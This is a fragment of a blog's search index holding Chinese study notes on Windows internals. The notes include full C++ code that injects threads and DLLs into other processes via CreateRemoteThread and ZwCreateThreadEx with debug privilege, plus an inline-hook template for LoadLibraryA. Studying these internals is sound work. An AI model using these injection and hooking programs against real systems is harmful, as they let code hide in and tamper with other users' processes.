bRet;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"API","slug":"API","permalink":"http://example.com/tags/API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【API】GetModuleHandle","date":"2024-01-23T06:08:51.910Z","path":"A_OS/Windows/API/GetModuleHandle/","text":"GetModuleHandle 函数用法 定义函数原型1typedef BOOL(WINAPI *LPFN_GLPI)(PSYSTEM_LOGICAL_PROCESSOR_INFORMATION, PDWORD); 获取函数123456789101112LPFN_GLPI glpi;glpi = (LPFN_GLPI)GetProcAddress( GetModuleHandle(TEXT(&quot;kernel32&quot;)), &quot;GetLogicalProcessorInformation&quot;);if (NULL == glpi)&#123; DbgTrace(L&quot;[%s]GetLogicalProcessorInformation is not supported.\\n&quot;, __FUNCTIONW__);&#125;else&#123; DbgTrace(L&quot;[%s]GetLogicalProcessorInformation is supported.\\n&quot;, __FUNCTIONW__);&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【todo】【API】CreateProcess 使用及调用流程","date":"2024-01-23T06:08:51.905Z","path":"A_OS/Windows/API/CreateProcess/","text":"概述：CreateProcess 的使用及调用流程 CreateProcess 的系统调用流程参考： Making NtCreateUserProcess Work - Hack.Learn.Share 使用说明函数原型参数说明Demo调用流程","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【API】 CreateRemoteThread 实例与详解","date":"2024-01-23T06:08:51.900Z","path":"A_OS/Windows/API/CreateRemoteThread/【API】CreateRemoteThread简单使用/","text":"概述：CreateRemoteThread 的简单使用 Demo 在阅读之前，建议大家带着几个问题 0x01说明打开一个 GUI 进程，并在进程中调用 MessageBox 弹出消息框。 关键说明：由于注入只能传递一个参数，因此不能直接在目标进程中调用 MessageBox. 因此至少需要创建一个只有一个入参的函数来传递 MessageBox 的相关调用。 步骤说明： 根据传递的进程名获取进程 PID 根据 PID 打开目标进程 申请内存写入调用函数的地址 申请内存写入调用函数的参数 创建远程线程调用写入的函数 0x02代码调用 CreateRemoteThread123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#pragma once#include &lt;windows.h&gt; #include &lt;TlHelp32.h&gt; #include &quot;stdio.h&quot; //线程参数结构体定义 typedef struct _RemoteParam &#123; char szMsg[12]; //MessageBox函数中显示的字符提示 DWORD dwMessageBox;//MessageBox函数的入口地址 &#125; RemoteParam, * PRemoteParam;//定义MessageBox类型的函数指针 typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCTSTR, LPCTSTR, DWORD);//线程函数定义 DWORD __stdcall threadProc(LPVOID lParam)&#123; RemoteParam* pRP = (RemoteParam*)lParam; PFN_MESSAGEBOX pfnMessageBox; pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox; pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0); return 0;&#125;//提升进程访问权限 bool enableDebugPriv()&#123; HANDLE hToken; LUID sedebugnameValue; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; return false; &#125; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123; CloseHandle(hToken); return false; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = sedebugnameValue; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; CloseHandle(hToken); return false; &#125; return true;&#125;//根据进程名称得到进程ID,如果有多个运行实例的话，返回第一个枚举到的进程的ID DWORD processNameToId(LPCTSTR lpszProcessName)&#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) &#123; MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; while (Process32Next(hSnapshot, &amp;pe)) &#123; if (!strcmp(lpszProcessName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; return 0;&#125;int main(int argc, char* argv[])&#123; //定义线程体的大小 const DWORD dwThreadSize = 4096; DWORD dwWriteBytes; //提升进程访问权限 enableDebugPriv(); char* szExeName = (char*)&quot;calc.exe&quot;; DWORD dwProcessId = processNameToId(szExeName); if (dwProcessId == 0) &#123; MessageBox(NULL, &quot;The target process have not been found !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1; &#125; //根据进程ID得到进程句柄 HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hTargetProcess) &#123; MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //在宿主进程中为线程体开辟一块存储区域 //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型 //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。 void* pRemoteThread = VirtualAllocEx(hTargetProcess, 0, dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!pRemoteThread) &#123; MessageBox(NULL, &quot;Alloc memory in target process failed !&quot;, &quot;notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //将线程体拷贝到宿主进程中 if (!WriteProcessMemory(hTargetProcess, pRemoteThread, &amp;threadProc, dwThreadSize, 0)) &#123; MessageBox(NULL, &quot;Write data to target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //定义线程参数结构体变量 RemoteParam remoteData; ZeroMemory(&amp;remoteData, sizeof(RemoteParam)); //填充结构体变量中的成员 HINSTANCE hUser32 = LoadLibrary(&quot;User32.dll&quot;); remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;); strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;); //为线程参数在宿主进程中开辟存储区域 RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx( hTargetProcess, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE); if (!pRemoteParam) &#123; MessageBox(NULL, &quot;Alloc memory failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //将线程参数拷贝到宿主进程地址空间中 if (!WriteProcessMemory(hTargetProcess, pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) &#123; MessageBox(NULL, &quot;Write data to target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; //在宿主进程中创建线程 HANDLE hRemoteThread = CreateRemoteThread( hTargetProcess, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread, pRemoteParam, 0, &amp;dwWriteBytes); if (!hRemoteThread) &#123; MessageBox(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; CloseHandle(hRemoteThread); FreeLibrary(hUser32); return 0;&#125; 调用 ZwCreateThreadEx123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192//////////////////////////////////// FileName : KernelFuncInject.cpp// Creator : PeterZheng// Date : 2019/01/10 21:32// Comment : Use Kernel Function To Inject//////////////////////////////////#pragma once#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;strsafe.h&gt;#include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;#ifdef _WIN64typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#elsetypedef DWORD(WINAPI *typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endifusing namespace std;// 提权函数BOOL EnableDebugPriv(LPCSTR name)&#123; HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tp; // 打开进程令牌 if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; printf(&quot;[!]Get Process Token Error!\\n&quot;); return false; &#125; // 获取权限Luid if (!LookupPrivilegeValue(NULL, name, &amp;luid)) &#123; printf(&quot;[!]Get Privilege Error!\\n&quot;); return false; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // 修改进程权限 if (!AdjustTokenPrivileges(hToken, false, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123; printf(&quot;[!]Adjust Privilege Error!\\n&quot;); return false; &#125; return true;&#125;// 根据进程名字获取进程IdBOOL GetProcessIdByName(CHAR *szProcessName, DWORD&amp; dwPid)&#123; HANDLE hSnapProcess = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess == NULL) &#123; printf(&quot;[*] Create Process Snap Error!\\n&quot;); return FALSE; &#125; PROCESSENTRY32 pe32 = &#123; 0 &#125;; ::RtlZeroMemory(&amp;pe32, sizeof(pe32)); pe32.dwSize = sizeof(pe32); BOOL bRet = ::Process32First(hSnapProcess, &amp;pe32); while (bRet) &#123; if (_stricmp(pe32.szExeFile, szProcessName) == 0) &#123; dwPid = pe32.th32ProcessID; return TRUE; &#125; bRet = ::Process32Next(hSnapProcess, &amp;pe32); &#125; return FALSE;&#125;int main(int argc, char* argv[])&#123; if (argc != 3) &#123; printf(&quot;[*] Format Error! \\nYou Should FOLLOW THIS FORMAT: &lt;APCInject EXENAME DLLNAME&gt; \\n&quot;); return 0; &#125; LPSTR szExeName = (LPSTR)::VirtualAlloc(NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); LPSTR szDllPath = (LPSTR)::VirtualAlloc(NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); ::RtlZeroMemory(szExeName, 100); ::RtlZeroMemory(szDllPath, 100); ::StringCchCopy(szExeName, 100, argv[1]); ::StringCchCopy(szDllPath, 100, argv[2]); DWORD dwPid = 0; // 系统进程必须先提权才能打开，否则在OpenProcess步骤会失败 EnableDebugPriv(SE_DEBUG_NAME); BOOL bRet = GetProcessIdByName(szExeName, dwPid); if (!bRet) &#123; printf(&quot;[*] Get Process Id Error!\\n&quot;); return 0; &#125; HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); if (hProcess == NULL) &#123; printf(&quot;[*] Open Process Error!\\n&quot;); return 0; &#125; DWORD dwDllPathLen = strlen(szDllPath) + 1; LPVOID lpBaseAddress = ::VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (lpBaseAddress == NULL) &#123; printf(&quot;[*] VirtualAllocEx Error!\\n&quot;); return 0; &#125; SIZE_T dwWriten = 0; // 把DLL路径字符串写入目标进程 ::WriteProcessMemory(hProcess, lpBaseAddress, szDllPath, dwDllPathLen, &amp;dwWriten); if (dwWriten != dwDllPathLen) &#123; printf(&quot;[*] Write Process Memory Error!\\n&quot;); return 0; &#125; // 获取LoadLibrary函数地址 LPVOID pLoadLibraryFunc = ::GetProcAddress(::GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (pLoadLibraryFunc == NULL) &#123; printf(&quot;[*] Get Func Address Error!\\n&quot;); return 0; &#125; HMODULE hNtdll = ::LoadLibrary(&quot;ntdll.dll&quot;); if (hNtdll == NULL) &#123; printf(&quot;[*] Load NtDLL Error!\\n&quot;); return 0; &#125; typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, &quot;ZwCreateThreadEx&quot;); if (ZwCreateThreadEx == NULL) &#123; printf(&quot;[*] Get NTDLL Func Address Error!\\n&quot;); return 0; &#125; DWORD dwStatus = 0; HANDLE hRemoteThread = NULL; dwStatus = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pLoadLibraryFunc, lpBaseAddress, 0, 0, 0, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;[*] Create Remote Thread Error!\\n&quot;); return 0; &#125; // DLL路径分割，方便输出 LPCSTR szPathSign = &quot;\\\\&quot;; LPSTR p = NULL; LPSTR next_token = NULL; p = strtok_s(szDllPath, szPathSign, &amp;next_token); while (p) &#123; StringCchCopy(szDllPath, 100, p); p = strtok_s(NULL, szPathSign, &amp;next_token); &#125; printf(&quot;[*] High Privilege Inject Info [%s ==&gt; %s] Success\\n&quot;, szDllPath, szExeName); ::CloseHandle(hProcess); ::FreeLibrary(hNtdll); ::VirtualFree(szExeName, 0, MEM_RELEASE); ::VirtualFree(szDllPath, 0, MEM_RELEASE); ::ExitProcess(0); return 0;&#125; ZwCreateThreadEx 分析ZwCreateThreadEx 属于 native 函数，微软官方并没有给出相关文档，本小节分析内容参考本文引用文章。 12345678910111213141516NTSTATUS ZwCreateThreadEx( OUT PHANDLE ThreadHandle, //输出参数，新创建的线程的句柄。 IN ACCESS_MASK DesiredAccess, //所需的访问权限标志，例如PROCESS_ALL_ACCESS代表全部权限 IN PVOID ObjectAttributes, //对象的属性，通常为NULL。 IN HANDLE ProcessHandle, //所创建线程将要在其内运行的进程的句柄 IN PTHREAD_START_ROUTINE StartRoutine, //新线程的开始地址 IN PVOID Argument, //要传递给新线程的参数 IN ULONG CreateFlags, //要传递给新线程的参数 //ZeroBits, StackSize, MaximumStackSize: 这些参数一般设置为0，表示使用默认的堆栈大小 IN ULONG_PTR ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList //用于传递更高级的线程属性，通常设置为NULL); 区分32位和64位操作系统： 123456789101112131415161718192021222324252627#ifdef _WIN64typedef DWORD(WINAPI* Fn_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#elsetypedef DWORD(WINAPI* Fn_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif 0x03 CreateRemoteThread 函数调用分析如下所示为上述代码在调用 CreateRemoteThread 之后的堆栈情况。 12345[0x0] ntdll!NtCreateThreadEx 0x57f524 0x77809a17 [0x1] KERNELBASE!CreateRemoteThreadEx+0x1e7 0x57f528 0x774b2e38 [0x2] KERNEL32!CreateRemoteThreadStub+0x28 0x57f81c 0x5a2c7a [0x3] DllInject!main+0x37a 0x57f844 0x5a36d3 [0x4] DllInject!invoke_main+0x33 0x57f998 0x5a3527 通过WinDbg查看函数 CreateRemoteThead 在用户模式下的调用流程，观察这个调用情况可以确定在用户模式下，这个函数涉及到了三个dll模块（KERNEL32、KERNELBASE、ntdll）。而 CreateRemoteThead 这个API在KERNEL32模块中真正的函数名是 CreateRemoteThreadStub ，通过这个KERNEL32中的 CreateRemoteThreadStub API将参数转发到KERNELBASE 模块中的 CreateRemoteThreadEx 中，然后在 KERNELBASE 中调用ntdll模块中的 NtCreateThreadEx API，进入内核。待内核处理结束后获取返回值，进行返回值的处理并返回结果。 系统调用以及 SSDT(System Service Descriptor Table)文章推荐：强烈建议可以阅读这篇文章 Windows-Internals&#x2F;System Architecture and Components&#x2F;System Service Descriptor Table.md at main · Faran-17&#x2F;Windows-Internals 函数说明根据上述已经有的堆栈，结合 IDA 查看下函数调用。 CreateRemoteThreadStub如下所示，为 CreateRemoteThreadStub 汇编和反汇编的代码，可以看到在 CreateRemoteThreadStub 中增加了一个参数，并且 dwCreationFlags 参数进行了校验，与标记 0x1004进行与操作，规避了无效参数，含义如下所示，而也就是增加的参数，会存在注入的dll不启动的情况。 值 含义 0 线程在创建后立即运行。 CREATE_SUSPENDED0x00000004 线程以挂起状态创建，在调用 ResumeThread 函数之前不会运行。 STACK_SIZE_PARAM_IS_A_RESERVATION 0x00010000 dwStackSize 参数指定堆栈的初始保留大小。 如果未指定此标志， dwStackSize 将指定提交大小。 CreateRemoteThreadExCreateRemoteThread函数位于KernelBase.dll中，最终调用了NtCreateThreadEx函数 如下所示为反汇编的 CreateRemoteThreadEx 函数。 这里可以关注下第七个参数，始终为 1，这个参数表示创建的线程始终为挂起状态。参考：安全之路 —— 利用内核函数实现注入系统进程 - 倚剑问天 - 博客园 函数原型： 12345678910111213141516NTSYSCALLAPINTSTATUSNTAPINtCreateThreadEx( _Out_ PHANDLE ThreadHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ProcessHandle, _In_ PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE _In_opt_ PVOID Argument, _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_* _In_ SIZE_T ZeroBits, _In_ SIZE_T StackSize, _In_ SIZE_T MaximumStackSize, _In_opt_ PPS_ATTRIBUTE_LIST AttributeList); NtCreateThreadEx这里先补充一个知识点，&#96;&#96;NtCreateThread与ZwCreateThread 的函数地址是一样的，NtCreateThreadEx与ZwCreateThreadEx的函数地址是一样的。区别就是 Nt 的为用户层函数，用户态调用时会使用 Nt 开头的，Zw 开头的会在内核调用。 可以利用ZwCreateThread&#96; 实现系统进程注入。前文有[相关代码](#调用 ZwCreateThreadEx). 用户态一般不会直接调用这个接口 汇编说明： mov eax, 0C7h：将值0c7h移动至eax寄存器，表示执行编号为0c7h的系统调用 syscall：这是执行系统调用的指令。系统调用编号和参数应在此之前已被设置好（在这种情况下，通过将 0xC7 和 rcx 的内容移动到 eax 和 r10） 这段代码表示执行编号为 0xC7 的系统调用，如果 ds:7FFE0308h 的最低位被设置，那么在系统调用前会先跳转到另一段代码（位于 loc_1800A0525，使用int 2Eh中断进入内核）。如果该位未被设置，那么直接执行系统调用 可以结合反汇编代码查看，如下所示： 1234567891011__int64 NtCreateThreadEx()&#123; __int64 result; // rax result = 194i64; if ( (MEMORY[0x7FFE0308] &amp; 1) != 0 ) // 查看标志位 __asm &#123; int 2Eh; DOS 2+ internal - EXECUTE COMMAND &#125; else __asm &#123; syscall; Low latency system call &#125; return result;&#125; 总结以下是CreateRemoteThread函数的调用流程图 应用程序调用 CreateRemoteThread，这是一个由 kernel32.dll 提供的 Win32 API，用于在另一个进程的地址空间中创建新线程。 CreateRemoteThread 内部调用 CreateRemoteThreadEx，这是一个由 KernelBase.dll 提供的更底层的 API，提供了更多的选项，比如可以指定安全描述符，可以控制新线程是否立即开始运行等 CreateRemoteThreadEx 内部调用 NtCreateThreadEx，这是由 ntdll.dll 提供的 Native API，也是用户空间可以直接调用的最底层的 API。 NtCreateThreadEx 函数设置好系统调用的参数后，执行 syscall 指令，切换到内核模式。 在内核模式下，根据 syscall 提供的系统调用编号，在 SSDT 表中查找对应的内核函数。 执行 SSDT 表中找到的函数，完成线程的创建。 flowchart TD A(CreateRemoteThread) --> B B(Kernel32!CreateRemoteThreadSutb) --> C C(Kernel32!CreateRemoteThreadEx) --> D D(ntdll!NtcreateThreadEx) --> F F(nt!NtcreateThreadEx) --> E E(syscall) --> G subgraph 内核区 G(SSDT) end 如下所示为一个略微详细的启动分析： 0x04 普通线程和远程线程的区别可以看到普通线程函数CreateThread也调用了CreateRemoteThread函数，只不过其线程句柄参数的值为 -1，而远程线程的句柄参数为目标进程句柄","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"},{"name":"CreateRemoteThread","slug":"A-OS/Windows/API/CreateRemoteThread","permalink":"http://example.com/categories/A-OS/Windows/API/CreateRemoteThread/"}]},{"title":"【Hook】 技术相关精华文章整理","date":"2024-01-23T06:08:33.915Z","path":"A_OS/Windows/【IH】Hook相关精华文章整理/","text":"概述：hook 相关文章 0x01 阅读列表 [原创]HOOK-编程技术-看雪-安全社区|安全招聘|kanxue.com 高级远程线程注入NtCreateThreadEx - iBinary - 博客园 使用NtCreateThreadEx将Dll注入目标进程 | 码农家园 线程创建过程分析NtCreateThread-PspCreateThread PsTerminateProcess结束进程 - gussing - 博客园 [原创]强制关闭进程的两种方法-编程技术-看雪-安全社区|安全招聘|kanxue.com 【技术分享】初探进程强杀 0x02 Hook 代码 MinHook - The Minimalistic x86&#x2F;x64 API Hooking Library - CodeProject","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【Hook】Windows Hook 模版","date":"2024-01-23T06:08:33.912Z","path":"A_OS/Windows/【IH】Hook模版/","text":"概述：hook注入的模版函数，以 hook loadlibrary 为例 主要是创建了 __InlineHOOK_Base 用于实现函数的注入。 由于程序在创建和执行时会使用 LoadLibrary 函数。 因此需要在调用是时先 unhook 在 Hook模版以下两个宏定义即可完成函数的hook 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154/* C/C++ HOOK API（原理深入剖析之-LoadLibraryA）_c++ loadlibrarya-CSDN博客: https://blog.csdn.net/masefee/article/details/4566121*/#include &lt;iostream&gt;#include &lt;Windows.h&gt;using namespace std;#pragma warning( disable: 4309 )#pragma warning( disable: 4311 )typedef HMODULE(WINAPI* HOOKAPI)(IN LPCSTR);#define MYHOOKMETHOD(__fun) HMODULE WINAPI __fun#define DECLARE_REGISTER( __0bj, __lawfunc, __newfunc ) Inline_Hook&lt; HOOKAPI, 1 &gt; __Obj( __lawfunc, __newfunc )struct __InlineHOOK_Base&#123; DWORD _argsBytes; void* _lawFunc; void* _newFunc; char _lawByteCode[16]; char _newByteCode[16]; bool unhook(void) &#123; // It&#x27;s hooked. if (memcmp(_newByteCode, _lawFunc, 16) == 0) &#123; DWORD dwOldFlag; VirtualProtect(_lawFunc, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag); memcpy(_lawFunc, _lawByteCode, 16); VirtualProtect(_lawFunc, 8, dwOldFlag, &amp;dwOldFlag); return true; &#125; return false; &#125; bool hook(void) &#123; // It&#x27;s saved. if (memcmp(_lawByteCode, _lawFunc, 16) == 0) &#123; DWORD dwOldFlag; VirtualProtect(_lawFunc, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag); memcpy(_lawFunc, _newByteCode, 16); VirtualProtect(_lawFunc, 8, dwOldFlag, &amp;dwOldFlag); return true; &#125; return false; &#125; __InlineHOOK_Base(void* lawfun, void* newfun, DWORD args);&#125;;void __declspec(naked) __Inline_Hook_Func(void)&#123; __asm &#123; push ebp // save maybe usefull register. push ebx push esi push ecx call __InlineHOOK_Base::unhook // first, remove the hook in order to call the normal function. test eax, eax // check the remove was successful jz __return __getargnum : mov eax, dword ptr[esp] // esp just is ecx, also is __InlineHOOK_Base&#x27;s this pointer. mov ecx, dword ptr[eax] // get first 4 bytes, that is params total size. shr ecx, 2 // get params num, equal with __InlineHOOK_Base::_argsBytes / sizeof( DWORD ) test ecx, ecx // check whether there are params. jz __callfunc // no param __pushargs : mov edx, esp // __InlineHOOK_Base&#x27;s this pointer. add edx, 14h // navigate to first call ret addr. add edx, dword ptr[eax]; // add params size. push dword ptr[edx]; // push the dll file name pointer. loop __pushargs __callfunc : call[eax + 8] // call my function . mov ecx, dword ptr[esp] // get __InlineHOOK_Base&#x27;s this pointer. push edx // save my function return value. push eax call __InlineHOOK_Base::hook // rehook. pop eax // get saved return value, provided to my superiors to use pop edx __return : pop ecx pop esi pop ebx pop ebp ret &#125;&#125;__InlineHOOK_Base::__InlineHOOK_Base(void* lawfun, void* newfun, DWORD args) : _lawFunc(lawfun), _newFunc(newfun), _argsBytes(args * 4)&#123; _newByteCode[0] = 0xB9; // mov ecx, ... (DWORD&amp;)_newByteCode[1] = (DWORD)this; _newByteCode[5] = 0xB8; // mov eax, ... (DWORD&amp;)_newByteCode[6] = (DWORD)__Inline_Hook_Func; (WORD&amp;)_newByteCode[10] = 0xD0FF; // call eax _newByteCode[12] = 0x000000C3; // ret if (args &gt; 0) &#123; _newByteCode[12] = 0xC2; // ret ... (WORD&amp;)_newByteCode[13] = (WORD)_argsBytes; _newByteCode[15] = 0; &#125; memcpy(_lawByteCode, _lawFunc, 16); // save&#125;template&lt; typename _function, DWORD args &gt;struct Inline_Hook : __InlineHOOK_Base&#123; Inline_Hook(_function lawfun, _function newfun) :__InlineHOOK_Base(lawfun, newfun, args) &#123; hook(); &#125; ~Inline_Hook(void) &#123; unhook(); &#125;&#125;;MYHOOKMETHOD(myLoadLibrary)(LPCSTR lpcStrFileName)&#123; ::MessageBoxA(NULL, lpcStrFileName, &quot;LoadLibrary Name&quot;, MB_OK | MB_ICONINFORMATION); return LoadLibraryA(lpcStrFileName);&#125;DECLARE_REGISTER(__inline_hook, LoadLibraryA, myLoadLibrary);int main(void)&#123; HMODULE hIntstance = LoadLibraryA(&quot;d3d9.dll&quot;); return 0;&#125; 如何使用，使用宏进行注入，在程序执行前完成。 1DECLARE_REGISTER(__inline_hook, LoadLibraryA, myLoadLibrary);","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【Hook】Dll 注入","date":"2024-01-23T06:08:33.909Z","path":"A_OS/Windows/【IH】dll注入/","text":"概述：windows 操作系统下注入dll到进程中 环境相关：win10操作系统注入本地编译的简单dll到notepad.exe 其他问题补充： CreateRemoteThread函数多参数传入使用方法_createremotethread 传递参数-CSDN博客 多参数问题：lem0nSec&#x2F;CreateRemoteThreadPlus: CreateRemoteThread: how to pass multiple parameters to the remote thread function without shellcode. 0x01、 基本知识注入dll的简单逻辑就是要在目标进程申请内存加载一个dll。分步骤来说就是： 打开进程 申请内存 写入内存 调用内存的函数 0x02、操作步骤前提 进程间内存独立 运行在安全模式下的Windows，每个进程的内存空间都是独立的，互相不能访问彼此，所以代码注入才是一件比较麻烦的事情 所有进程中 kernel32.dll地址相同 每个进程都会加载kernel32.dll，并且在那些进程中，这个库的地址都是一样的 原理dll注入主要分为如下几个步骤 提权：如果不提权的话，进程列表中很多进程是打不开的，并且可能获取不到PROCESS_ALL_ACCESS权限 获取PID：这部分不是必须的，但是PID每次运行都不一样，所以最好能获取，这里通过CreateToolhelp32Snapshot()函数获取进程，遍历结果之后得到对应的PID 打开进程：通过OpenProcess()函数打开进程，同时指定权限是PROCESS_ALL_ACCESS权限，否则后面操作会失败，如果要获取这个权限就得先提权 通过VirtualAllocEx()函数在目标进程中申请内存，然后用WriteProcessMemory()函数将LoadLibraey()函数的参数准备好写入到内存中 通过LoadLibrary()函数加载kernel32.dll，实际上进程都会加载这个，第二次加载似乎直接获取模块句柄了。 通过GetProcAddress()函数获取到LoadLibraryW()函数的地址，因为kernel32.dll在所有进程中的地址都相同，所以，在本进程中获取的函数地址在目标进程中也是那个函数 通过CreateRemoteThread()函数在目标进程中创建一个线程，执行LoadLibraryW()函数载入自己的dll 0x03、代码InjectDll.exeInjectDll.exe 的代码如下所示： 完成了注入 simpledll.dll 到 notepad.exe 的功能 